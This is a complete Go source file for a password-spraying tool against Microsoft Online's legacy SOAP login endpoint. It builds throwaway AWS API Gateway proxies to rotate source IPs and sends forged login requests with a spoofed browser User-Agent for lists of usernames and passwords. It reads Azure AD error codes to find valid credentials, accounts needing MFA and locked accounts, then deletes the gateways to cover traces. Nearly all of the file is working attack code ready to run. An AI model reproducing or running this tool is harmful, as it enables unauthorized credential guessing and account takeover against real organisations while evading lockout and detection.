package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/beevik/etree"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/awserr"
	"github.com/aws/aws-sdk-go/aws/credentials"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/apigateway"
)

var msoUrl = "https://login.microsoftonline.com/rst2.srf"
var endpointName = "rotate"

// Uncomment regions as required
var availableRegions = []string{
	"us-east-1",
	// "us-west-1", "us-east-2",
	// "us-west-2", "eu-central-1", "eu-west-1",
	// "eu-west-2", "eu-west-3", "sa-east-1", "eu-north-1",
}

type Deployment struct {
	DeploymentId string
	RestApiId    string
	ResourceId   string
	Url          string
	Region       string
}

// createAWSAPIGateway creates an API Deployment to proxy the request
func createAPIGateway(accessKey, secretKey, region string) (Deployment, error) {
	var deployment Deployment

	creds := credentials.NewStaticCredentials(accessKey, secretKey, "")
	sess, err := session.NewSession(&aws.Config{
		Region:      aws.String(region),
		Credentials: creds,
	})
	if err != nil {
		return deployment, err
	}

	svc := apigateway.New(sess)

	restApi, err := svc.CreateRestApi(&apigateway.CreateRestApiInput{
		EndpointConfiguration: &apigateway.EndpointConfiguration{
			Types: aws.StringSlice([]string{"REGIONAL"}),
		},
		Name: aws.String(endpointName),
	})
	if err != nil {
		return deployment, err
	}

	getResource, err := svc.GetResource(&apigateway.GetResourceInput{
		ResourceId: restApi.RootResourceId,
		RestApiId:  restApi.Id,
	})
	if err != nil {
		return deployment, err
	}

	createdResource, err := svc.CreateResource(&apigateway.CreateResourceInput{
		ParentId:  getResource.Id,
		PathPart:  aws.String("{proxy+}"),
		RestApiId: restApi.Id,
	})
	if err != nil {
		return deployment, err
	}

	_, err = svc.PutMethod(&apigateway.PutMethodInput{
		AuthorizationType: aws.String("NONE"),
		HttpMethod:        aws.String("ANY"),
		RequestModels:     map[string]*string{},
		RequestParameters: aws.BoolMap(map[string]bool{
			"method.request.path.proxy":                  true,
			"method.request.header.X-My-X-Forwarded-For": true,
		}),
		ResourceId: getResource.Id,
		RestApiId:  restApi.Id,
	})
	if err != nil {
		return deployment, err
	}

	_, err = svc.PutIntegration(&apigateway.PutIntegrationInput{
		ConnectionType:        aws.String("INTERNET"),
		HttpMethod:            aws.String("ANY"),
		IntegrationHttpMethod: aws.String("ANY"),
		RequestParameters: aws.StringMap(map[string]string{
			"integration.request.path.proxy":             "method.request.path.proxy",
			"integration.request.header.X-Forwarded-For": "method.request.header.X-My-X-Forwarded-For",
		}),
		ResourceId: getResource.Id,
		RestApiId:  restApi.Id,
		Type:       aws.String("HTTP_PROXY"),
		Uri:        aws.String(msoUrl),
	})
	if err != nil {
		return deployment, err
	}

	_, err = svc.PutMethod(&apigateway.PutMethodInput{
		AuthorizationType: aws.String("NONE"),
		HttpMethod:        aws.String("ANY"),
		RequestModels:     map[string]*string{},
		RequestParameters: aws.BoolMap(map[string]bool{
			"method.request.path.proxy":                  true,
			"method.request.header.X-My-X-Forwarded-For": true,
		}),
		ResourceId: createdResource.Id,
		RestApiId:  restApi.Id,
	})
	if err != nil {
		return deployment, err
	}

	_, err = svc.PutIntegration(&apigateway.PutIntegrationInput{
		ConnectionType:        aws.String("INTERNET"),
		HttpMethod:            aws.String("ANY"),
		IntegrationHttpMethod: aws.String("ANY"),
		RequestParameters: aws.StringMap(map[string]string{
			"integration.request.path.proxy":             "method.request.path.proxy",
			"integration.request.header.X-Forwarded-For": "method.request.header.X-My-X-Forwarded-For",
		}),
		ResourceId: createdResource.Id,
		RestApiId:  restApi.Id,
		Type:       aws.String("HTTP_PROXY"),
		Uri:        &msoUrl,
	})
	if err != nil {
		return deployment, err
	}

	createdDeployment, err := svc.CreateDeployment(&apigateway.CreateDeploymentInput{
		RestApiId: restApi.Id,
		StageName: aws.String(endpointName),
	})
	if err != nil {
		return deployment, err
	}

	_, err = svc.CreateUsagePlan(&apigateway.CreateUsagePlanInput{
		ApiStages: []*apigateway.ApiStage{
			{
				ApiId: restApi.Id,
				Stage: aws.String(endpointName),
			},
		},
		Description: restApi.Id,
		Name:        aws.String(endpointName),
	})
	if err != nil {
		return deployment, err
	}

	deployment.Url = fmt.Sprintf("https://%s.execute-api.%s.amazonaws.com:443/%s", *restApi.Id, region, endpointName)
	deployment.Region = region
	deployment.RestApiId = *restApi.Id
	deployment.DeploymentId = *createdDeployment.Id
	deployment.ResourceId = *createdResource.Id

	return deployment, nil
}

// deleteAWSAPIGateway deletes the Deployment after it is used
func deleteAWSAPIGateway(accessKey, secretKey string, deployment Deployment) error {
	creds := credentials.NewStaticCredentials(accessKey, secretKey, "")
	sess, err := session.NewSession(&aws.Config{
		Region:      aws.String(deployment.Region),
		Credentials: creds,
	})
	if err != nil {
		return err
	}

	svc := apigateway.New(sess, &aws.Config{
		Region: aws.String(deployment.Region),
	})

	restApi, err := svc.GetRestApis(&apigateway.GetRestApisInput{})
	if err != nil {
		return err
	}

	for _, x := range restApi.Items {
		if *x.Name == endpointName {
			_, err := svc.DeleteRestApi(&apigateway.DeleteRestApiInput{
				RestApiId: x.Id,
			})
			if err != nil {
				return err
			}
		}

	}

	return nil
}

// cleanUpAWSAPIGateways cleans up unused AWS gateways
func cleanUpAWSAPIGateways(accessKey, secretKey string) error {
	creds := credentials.NewStaticCredentials(accessKey, secretKey, "")
	for _, region := range availableRegions {
		sess, err := session.NewSession(&aws.Config{
			Region:      aws.String(region),
			Credentials: creds,
		})
		if err != nil {
			return err
		}

	Retry:
		svc := apigateway.New(sess, &aws.Config{
			Region: aws.String(region),
		})

		restApi, err := svc.GetRestApis(&apigateway.GetRestApisInput{})
		if err != nil {
			return err
		}

		for _, x := range restApi.Items {
			if *x.Name == endpointName {
				log.Printf("[-] Deleting API \"%s\", with ID \"%s\"", *x.Name, *x.Id)
				_, err := svc.DeleteRestApi(&apigateway.DeleteRestApiInput{
					RestApiId: x.Id,
				})

				if err != nil {
					if awsErr, ok := err.(awserr.Error); ok {
						if awsErr.Code() == "TooManyRequestsException" {
							log.Printf("[!] API Throttled in region %s sleeping for 10 seconds...\n", region)
							time.Sleep(10 * time.Second)
							goto Retry
						} else {
							return err
						}
					}
				}

			}

		}

	}
	return nil
}

// sendRequest sends an HTTP POST request to a given deployment
func sendRequest(user, password string, deployment Deployment) (string, error) {
	var output string
	requestBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust"><S:Header><wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action><wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To><ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo"><ps:BinaryVersion>5</ps:BinaryVersion><ps:HostingApp>Managed IDCRL</ps:HostingApp></ps:AuthInfo><wsse:Security><wsse:UsernameToken wsu:Id="user"><wsse:Username>` + user + `</wsse:Username><wsse:Password>` + password + `</wsse:Password></wsse:UsernameToken></wsse:Security></S:Header><S:Body><wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0"><wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType><wsp:AppliesTo><wsa:EndpointReference><wsa:Address>online.lync.com</wsa:Address></wsa:EndpointReference></wsp:AppliesTo><wsp:PolicyReference URI="MBI"></wsp:PolicyReference></wst:RequestSecurityToken></S:Body></S:Envelope>`)
	request, err := http.NewRequest("POST", deployment.Url, strings.NewReader(requestBody))
	if err != nil {
		return output, err
	}
	request.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582")

	resp, err := http.Post(deployment.Url, "application/xml", request.Body)
	if err != nil {
		log.Println(err)
	}
	defer resp.Body.Close()

	// Read and print the response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println("Error reading response body:", err)
	}

	etr := etree.NewDocument()
	etr.ReadFromBytes(body)
	xml := etr.FindElement("//psf:text")

	var fullError string

	if xml != nil {
		fullError = xml.Text()
	}

	errorCode := strings.Split(fullError, ":")

	// Error codes: https://learn.microsoft.com/en-us/azure/active-directory/develop/reference-error-codes
	// Only useful ones are included
	errorCodeMessages := map[string]string{
		"":            "[+] Login found: ",
		"AADSTS50076": "[+] Valid login, MFA required.",
		"AADSTS50079": "[+] Valid login, MFA required.",
		"AADSTS53004": "[+] Valid login, user must enroll in MFA.",
		"AADSTS50034": "[-] Invalid user: ",
		"AADSTS50057": "[-] Account disabled: ",
		"AADSTS50126": "[-] User found, invalid password: ",
		"AADSTS50059": "[-] Domain not found.",
		"AADSTS50055": "[!] Valid login, expired password: ",
		"AADSTS50053": "[-] Account locked: ",
		"default":     "[!] Unknown error.",
	}

	output = errorCodeMessages[errorCode[0]] + user
	if errorCode[0] == "" {
		output += " : " + password
	}

	return output, nil
}

type flagVars struct {
	Help         bool
	Cleanup      bool
	Username     string
	UsernameFile string
	Domain       string
	Password     string
	PasswordFile string
	UserPassFile string
	Delay        int
	OutFilePath  string
	AccessKey    string
	SecretKey    string
}

// flagOptions parses command-line flags and returns flag variables
func flagOptions() *flagVars {
	Help := flag.Bool("h", false, "")
	Cleanup := flag.Bool("cleanup", false, "")
	Username := flag.String("user", "", "")
	UsernameFile := flag.String("userfile", "", "")
	Domain := flag.String("domain", "", "")
	Password := flag.String("pass", "", "")
	PasswordFile := flag.String("passfile", "", "")
	UserPassFile := flag.String("userpassfile", "", "")
	Delay := flag.Int("delay", 1, "")
	OutFilePath := flag.String("output", "", "")
	AccessKey := flag.String("accesskey", "", "")
	SecretKey := flag.String("secretkey", "", "")

	flag.Parse()
	return &flagVars{
		Help:         *Help,
		Cleanup:      *Cleanup,
		Username:     *Username,
		UsernameFile: *UsernameFile,
		Domain:       *Domain,
		Password:     *Password,
		PasswordFile: *PasswordFile,
		UserPassFile: *UserPassFile,
		Delay:        *Delay,
		OutFilePath:  *OutFilePath,
		AccessKey:    *AccessKey,
		SecretKey:    *SecretKey,
	}
}

var usage = `Usage:
  -h            Print help information
  -user         Username for authentication
  -userfile     Path to a file containing a list of usernames
  -domain       Domain for authentication
  -pass         Password for authentication
  -passfile     Path to a file containing a list of passwords
  -userpassfile Path to a file containing a list of username:password pairs
  -delay        Delay between requests in seconds (default: 1)
  -output       Path to the output file for results
  -accesskey    AWS access key for API Gateway deployment
  -secretkey    AWS secret key for API Gateway deployment
  -cleanup		Cleans up unused AWS API Gateways, loops until complete
`

type DeploymentPool struct {
	Deployments []Deployment
}

func main() {
	var deploymentPool DeploymentPool

	flags := flagOptions()
	if len(os.Args) < 2 {
		fmt.Println("[!] Cannot run without arguments!")
		fmt.Println(usage)
		os.Exit(0)
	}

	if flags.Help {
		fmt.Println(usage)
		return
	}

	if flags.Cleanup {
		cleanUpAWSAPIGateways(flags.AccessKey, flags.SecretKey)
		log.Println("[+] Cleanup complete!")
		os.Exit(0)
	}

	// Automatically delete the API gateways if user exits before end of execution
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		sig := <-sigChan

		fmt.Printf("\n[!] Received signal: %v\n", sig)
		if len(deploymentPool.Deployments) != 0 {
			for _, dep := range deploymentPool.Deployments {
				err := deleteAWSAPIGateway(flags.AccessKey, flags.SecretKey, dep)
				if err != nil {
					log.Println("[!] Error deleting API Gateway:", err)
				} else {
					log.Println("[-] API Gateway deleted: ", dep.Url)
				}
			}
		}

		os.Exit(0)
	}()

	usernames := getUsernames(flags)
	passwords := getPasswords(flags)
	domain := getDomain(flags)
	rand.Seed(time.Now().UnixNano())

	for _, reg := range availableRegions {
		deployment, err := createAPIGateway(flags.AccessKey, flags.SecretKey, reg)
		if err != nil {
			log.Println("[!] Error creating API Gateway:", err)
			return
		}
		deploymentPool.Deployments = append(deploymentPool.Deployments, deployment)
		log.Println("[+] API Gateway deployed:", deployment.Url)
		fmt.Println()

	}

	for _, pass := range passwords {
		for i, user := range usernames {
			user = ensureDomain(user, domain)

			if flags.UserPassFile != "" {
				pass = passwords[i]
			}
			randomIndex := rand.Intn(len(deploymentPool.Deployments))

			result, err := sendRequest(user, pass, deploymentPool.Deployments[randomIndex])
			if err != nil {
				log.Println(err)
				time.Sleep(1 * time.Second)
			}
			log.Println(result)
			if flags.OutFilePath != "" {
				writeToFile(flags.OutFilePath, result+"\n")
			}
			if i < len(usernames)-1 {
				time.Sleep(time.Duration(flags.Delay))
			}

		}
	}
TryAgain:
	for _, dep := range deploymentPool.Deployments {
		err := deleteAWSAPIGateway(flags.AccessKey, flags.SecretKey, dep)
		if err != nil {
			if awsErr, ok := err.(awserr.Error); ok {
				if awsErr.Code() == "TooManyRequestsException" {
					log.Printf("[!] Error deleting API Gateway: TooManyRequestsException in %s, retrying in 10 seconds...\n", dep.Region)
					log.Println("[+] Alternatively, rerun the tool with the -cleanup flag at a later time")
					time.Sleep(10 * time.Second)
					goto TryAgain
				}
			} else {
				log.Println("[!] Error deleting API Gateway:", err)
			}
		} else {
			fmt.Println()
			log.Println("[-] API Gateway deleted:", dep.Url)
		}
	}

}

// getUsernames extracts usernames from command-line flags and files
func getUsernames(flags *flagVars) []string {
	var usernames []string

	if flags.Username != "" {
		usernames = append(usernames, flags.Username)
	}

	if flags.UsernameFile != "" {
		usernames = appendFromTextFile(usernames, flags.UsernameFile)
	}

	if flags.UserPassFile != "" {
		usernames, _ = appendUserPassFromFile(usernames, flags.UserPassFile)
	}

	if usernames == nil {
		log.Println("[!] Must provide a user via one of:\n\t-user user.name, -userfile ./user_list.txt, -userpassfile ./userpass_file.txt")
		os.Exit(0)
	}

	return usernames
}

// getPasswords extracts passwords from command-line flags and files
func getPasswords(flags *flagVars) []string {
	var passwords []string

	if flags.Password != "" {
		passwords = append(passwords, flags.Password)
	}

	if flags.PasswordFile != "" {
		passwords = appendFromTextFile(passwords, flags.PasswordFile)
	}

	if flags.UserPassFile != "" {
		_, passwords = appendUserPassFromFile(nil, flags.UserPassFile)
	}

	if passwords == nil {
		log.Println("[!] Must provide a password via one of:\n\t-pass p4ssw0rd, -passfile ./pass_list.txt, -userpassfile ./userpass_file.txt")
		os.Exit(0)
	}

	return passwords
}

// appendFromTextFile appends items from a text file to a slice
func appendFromTextFile(slice []string, filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		log.Println(err)
		os.Exit(0)
	}
	defer file.Close()

	list := bufio.NewScanner(file)
	for list.Scan() {
		slice = append(slice, list.Text())
	}
	err = list.Err()
	if err != nil {
		log.Println(err)
		os.Exit(0)
	}

	return slice
}

// appendUserPassFromFile appends usernames and passwords from a file to slices
func appendUserPassFromFile(users []string, filename string) ([]string, []string) {
	file, err := os.Open(filename)
	if err != nil {
		log.Println(err)
		os.Exit(0)
	}
	defer file.Close()

	list := bufio.NewScanner(file)
	var passwords []string
	for list.Scan() {
		split := strings.Split(list.Text(), ":")
		if len(split) > 1 {
			users = append(users, split[0])
			passwords = append(passwords, split[1])
		}
	}
	err = list.Err()
	if err != nil {
		log.Println(err)
		os.Exit(0)
	}

	return users, passwords
}

// getDomain extracts the domain from command-line flags
func getDomain(flags *flagVars) string {
	if flags.Domain != "" {
		return fmt.Sprintf("@" + flags.Domain)
	} else {
		log.Println("[!] Must provide domain:\n\t-d domain.com")
		os.Exit(0)
		return ""
	}
}

// ensureDomain ensures that a username includes a domain if not already present
func ensureDomain(username, domain string) string {
	if !strings.Contains(username, "@") {
		return username + domain
	}
	return username
}

// writeToFile writes content to a file
func writeToFile(filename, content string) {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Println(err)
		return
	}
	defer file.Close()

	_, err = file.WriteString(content)
	if err != nil {
		log.Println(err)
	}
}
